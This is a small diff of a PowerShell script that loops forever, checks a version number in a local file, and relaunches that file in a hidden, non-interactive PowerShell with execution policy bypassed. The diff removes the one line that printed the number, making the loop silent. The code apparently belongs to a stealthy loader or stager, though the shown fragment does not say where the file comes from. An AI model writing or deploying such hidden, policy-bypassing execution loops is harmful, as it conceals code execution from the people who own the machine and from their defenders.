@@ -32,7 +32,6 @@ while ($true) {
 
         $linhaatual = (Get-Content -Path $localFilePath -TotalCount 1).Trim()
         $numeroatual = ObterNumeroAposHash -linha $linhaatual
-        Write-Host "$numeroatual"
 
         if ($numeroInicial -ne $numeroAtual) {
             Start-Process -FilePath "powershell.exe" -ArgumentList "-w h -NoP -NonI -Exec Bypass -File $localFilePath"
